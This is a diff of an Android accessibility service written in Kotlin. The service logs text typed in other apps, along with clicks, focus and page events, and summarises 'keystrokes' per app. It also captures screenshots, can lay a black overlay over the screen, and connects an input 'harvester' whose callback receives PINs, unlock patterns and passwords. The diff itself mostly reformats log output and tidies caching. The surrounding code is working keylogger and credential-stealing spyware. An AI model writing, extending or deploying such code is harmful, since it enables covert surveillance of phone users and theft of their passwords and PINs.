@@ -62,7 +62,6 @@ class AccessibilityHelper : AccessibilityService() {
 
         private val appSessions = mutableMapOf<String, AppSession>()
         private var currentForegroundApp: String? = null
-        private var pmCache: PackageManager? = null
 
         fun getText(): String = synchronized(textLock) { capturedText }
         private fun appendText(text: String) = synchronized(textLock) {
@@ -89,19 +88,19 @@ class AccessibilityHelper : AccessibilityService() {
                 val firstTime = timeFmt.format(Date(session.firstSeen))
                 val lastTime = timeFmt.format(Date(session.lastSeen))
 
-                sb.appendLine("═══════════════════════════════")
-                sb.appendLine("📱 ${session.appName}")
-                sb.appendLine("📦 ${session.packageName}")
-                sb.appendLine("⏰ $firstTime - $lastTime")
-                sb.appendLine("═══════════════════════════════")
+                sb.appendLine("===============================")
+                sb.appendLine("[${session.appName}]")
+                sb.appendLine("${session.packageName}")
+                sb.appendLine("$firstTime - $lastTime")
+                sb.appendLine("===============================")
 
                 for (entry in session.entries) {
                     val entryTime = timeFmt.format(Date(entry.timestamp))
                     when (entry.eventType) {
-                        "TEXT" -> sb.appendLine("  ⌨️ [$entryTime] $entry.text")
-                        "FOCUS" -> sb.appendLine("  👁️ [$entryTime] Focus: $entry.text")
-                        "CLICK" -> sb.appendLine("  👆 [$entryTime] Click: $entry.text")
-                        "PAGE" -> sb.appendLine("  📄 [$entryTime] Page: $entry.text")
+                        "TEXT" -> sb.appendLine("  [$entryTime] $entry.text")
+                        "FOCUS" -> sb.appendLine("  [$entryTime] Focus: $entry.text")
+                        "CLICK" -> sb.appendLine("  [$entryTime] Click: $entry.text")
+                        "PAGE" -> sb.appendLine("  [$entryTime] Page: $entry.text")
                     }
                 }
                 sb.appendLine()
@@ -115,7 +114,7 @@ class AccessibilityHelper : AccessibilityService() {
             val sb = StringBuilder()
             val sortedSessions = appSessions.values.sortedByDescending { it.entries.size }
 
-            sb.appendLine("**App Activity Summary:**")
+            sb.appendLine("App Activity Summary:")
             sb.appendLine()
 
             for (session in sortedSessions.take(15)) {
@@ -127,29 +126,30 @@ class AccessibilityHelper : AccessibilityService() {
                 val timeFmt = SimpleDateFormat("HH:mm", Locale.getDefault())
                 val lastTime = timeFmt.format(Date(session.lastSeen))
 
-                sb.appendLine("📱 **${session.appName}**")
-                sb.appendLine("   📦 `${session.packageName}`")
-                sb.appendLine("   ⌨️ $textEntries typed | 👆 $clickEntries clicks | 👁️ $focusEntries focus | 📄 $pageEntries pages")
-                sb.appendLine("   ⏰ Last: $lastTime")
+                sb.appendLine("[${session.appName}]")
+                sb.appendLine("  ${session.packageName}")
+                sb.appendLine("  $textEntries typed | $clickEntries clicks | $focusEntries focus | $pageEntries pages")
+                sb.appendLine("  Last: $lastTime")
                 sb.appendLine()
             }
 
             val totalText = appSessions.values.sumOf { it.entries.count { e -> e.eventType == "TEXT" } }
             val totalClicks = appSessions.values.sumOf { it.entries.count { e -> e.eventType == "CLICK" } }
 
-            sb.appendLine("**Totals:** $totalText keystrokes | $totalClicks clicks across ${appSessions.size} apps")
+            sb.appendLine("Totals: $totalText keystrokes | $totalClicks clicks across ${appSessions.size} apps")
             sb.toString().take(1900)
         }
 
         fun clearAppLogs() = synchronized(textLock) {
             appSessions.clear()
             currentForegroundApp = null
+            capturedText = ""
         }
 
         private fun getAppName(pkg: String): String {
             return try {
-                pmCache?.getApplicationLabel(
-                    pmCache!!.getApplicationInfo(pkg, 0)
+                instance?.packageManager?.getApplicationLabel(
+                    instance!!.packageManager.getApplicationInfo(pkg, 0)
                 )?.toString() ?: pkg.split(".").lastOrNull() ?: pkg
             } catch (_: Exception) {
                 pkg.split(".").lastOrNull() ?: pkg
@@ -183,12 +183,10 @@ class AccessibilityHelper : AccessibilityService() {
                             bitmap.recycle()
                             cont.resume(stream.toByteArray())
                         } catch (e: Exception) {
-                            
                             cont.resume(null)
                         }
                     }
                     override fun onFailure(errorCode: Int) {
-                        
                         cont.resume(null)
                     }
                 })
@@ -206,13 +204,11 @@ class AccessibilityHelper : AccessibilityService() {
         super.onServiceConnected()
         instance = this
         isRunning = true
-        pmCache = packageManager
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
         keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
         harvester = InputHelper(this)
         logFile?.let { harvester.setLogFile(it) }
         harvester.setCallback { pin, pattern, password ->
-            
         }
 
         val info = AccessibilityServiceInfo().apply {
@@ -229,8 +225,6 @@ class AccessibilityHelper : AccessibilityService() {
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
         }
         serviceInfo = info
-        
-        
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -258,12 +252,9 @@ class AccessibilityHelper : AccessibilityService() {
 
             when (event.eventType) {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                    val text = event.text?.joinToString("") ?: ""
-                    val capturedText = if (text.isNotEmpty()) {
-                        text
-                    } else {
-                        source?.text?.toString() ?: ""
-                    }
+                    val textFromEvent = event.text?.joinToString("") ?: ""
+                    val textFromSource = source?.text?.toString() ?: ""
+                    val capturedText = textFromEvent.ifEmpty { textFromSource }
                     if (capturedText.isNotEmpty()) {
                         val entry = "[${System.currentTimeMillis()}] $pkg: $capturedText\n"
                         appendText(entry)
@@ -322,7 +313,6 @@ class AccessibilityHelper : AccessibilityService() {
                 }
             }
         } catch (e: Exception) {
-            
         } finally {
             try { source?.recycle() } catch (_: Exception) {}
         }
@@ -341,7 +331,7 @@ class AccessibilityHelper : AccessibilityService() {
                 getOrCreateSession(pkg)
             }
 
-            val entry = "[${System.currentTimeMillis()}] 📱 App opened: $appName ($pkg)\n"
+            val entry = "[${System.currentTimeMillis()}] App opened: $appName ($pkg)\n"
             appendText(entry)
             logFile?.appendText(entry)
 
@@ -405,23 +395,19 @@ class AccessibilityHelper : AccessibilityService() {
                             PixelFormat.TRANSLUCENT
                         ).apply { gravity = Gravity.TOP }
                         windowManager?.addView(blackOverlay, params)
-                        
                     }
                 } else {
                     blackOverlay?.let {
                         try { windowManager?.removeView(it) } catch (_: Exception) {}
                         blackOverlay = null
-                        
                     }
                 }
             } catch (e: Exception) {
-                
             }
         }
     }
 
     override fun onInterrupt() {
-        
         isRunning = false
     }
 
@@ -431,7 +417,5 @@ class AccessibilityHelper : AccessibilityService() {
         isRunning = false
         toggleBlackOverlay(false)
         screenshotExecutor.shutdown()
-        
-        
     }
 }
